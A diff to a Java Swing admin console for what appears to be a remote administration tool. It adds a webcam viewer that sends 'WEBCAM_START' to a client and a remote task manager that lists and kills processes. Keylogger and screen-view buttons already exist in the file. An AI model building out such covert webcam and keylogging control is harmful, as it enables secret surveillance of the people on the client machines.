@@ -25,6 +25,8 @@ public class AdminServerApp extends JFrame {
     private Map<String, JPanel> clientCards = new HashMap<String, JPanel>();
     private Map<String, JLabel> bigScreenLabels = new HashMap<String, JLabel>();
     private Map<String, BufferedImage> latestScreens = new HashMap<String, BufferedImage>();
+    private Map<String, JLabel> webcamLabels = new HashMap<String, JLabel>();
+
 
     private final Color BG = new Color(7, 7, 8);
     private final Color PANEL = new Color(15, 17, 20);
@@ -1039,17 +1041,17 @@ public void removeClientCard(String clientName) {
         openBigScreen(clientName);
     });
 
-    webcamBtn.addActionListener(e -> {
-        addLog("[WEBCAM] Open webcam for " + clientName);
-    });
+    webcamBtn.addActionListener(e -> openWebcamWindow(clientName));
+
 
     keyloggerBtn.addActionListener(e -> {
         addLog("[KEYLOGGER] Open keylogger for " + clientName);
     });
 
     taskBtn.addActionListener(e -> {
-        addLog("[TASK] Open task manager for " + clientName);
-    });
+    addLog("[TASK] Open task manager for " + clientName);
+    openTaskManagerWindow(clientName);
+});
 
 
     powerBtn.addActionListener(e -> {
@@ -1070,6 +1072,76 @@ public void removeClientCard(String clientName) {
     dialog.add(actionPanel, BorderLayout.CENTER);
 
     dialog.setVisible(true);
+}
+
+    private void openWebcamWindow(String clientName) {
+        JFrame frame = new JFrame("Webcam - " + clientName);
+        JLabel previewLabel = new JLabel("Chờ hình ảnh...", SwingConstants.CENTER);
+        previewLabel.setOpaque(true);
+        previewLabel.setBackground(Color.BLACK);
+        previewLabel.setForeground(MUTED);
+        previewLabel.setFont(new Font("Consolas", Font.BOLD, 18));
+        previewLabel.setBorder(BorderFactory.createLineBorder(RED, 1));
+
+        frame.add(previewLabel);
+        frame.setSize(420, 340);
+        frame.setLocationRelativeTo(this);
+        frame.setVisible(true);
+
+        // Đăng ký label
+        controller.registerWebcamLabel(clientName, previewLabel);
+
+        // Gửi lệnh tới client
+        controller.sendCommandToClient(clientName, "WEBCAM_START");
+        addLog("[WEBCAM] Requested webcam from " + clientName);
+    }
+
+    private void openTaskManagerWindow(String clientName) {
+    JFrame frame = new JFrame("Task Manager - " + clientName);
+    frame.setSize(600, 400);
+    frame.setLocationRelativeTo(this);
+
+    DefaultTableModel model = new DefaultTableModel(
+            new String[]{"Process Name", "PID", "Memory"}, 0
+    );
+    JTable table = new JTable(model);
+    JScrollPane scroll = new JScrollPane(table);
+
+    JButton btnRefresh = new JButton("Refresh");
+    JButton btnKill = new JButton("Kill Process");
+
+    btnRefresh.addActionListener(e -> {
+        System.out.println("[ADMIN] Refresh for " + clientName);
+        // Gửi lệnh tới task server qua socket task (không phải main socket)
+        model.setRowCount(0); // Clear table
+        model.addRow(new Object[]{"Loading...", "...", "..."});
+        
+        // Gửi GET_PROCESS_LIST qua socket task
+        controller.sendTaskCommand(clientName, "GET_PROCESS_LIST");
+        addLog("[TASK] Refresh request sent");
+    });
+
+    btnKill.addActionListener(e -> {
+        int row = table.getSelectedRow();
+        if (row == -1 || model.getValueAt(row, 0).toString().equals("Loading...")) {
+            JOptionPane.showMessageDialog(frame, "Select a valid process!");
+            return;
+        }
+        String pid = model.getValueAt(row, 1).toString();
+        controller.sendTaskCommand(clientName, "KILL_PROCESS|" + pid);
+        addLog("[TASK] Kill PID " + pid);
+    });
+
+    JPanel top = new JPanel();
+    top.add(btnRefresh);
+    top.add(btnKill);
+
+    frame.add(top, BorderLayout.NORTH);
+    frame.add(scroll, BorderLayout.CENTER);
+    frame.setVisible(true);
+
+    controller.registerTaskTable(clientName, table, model);
+    controller.sendCommandToClient(clientName, "TASK_MANAGER_START");
 }
 
 
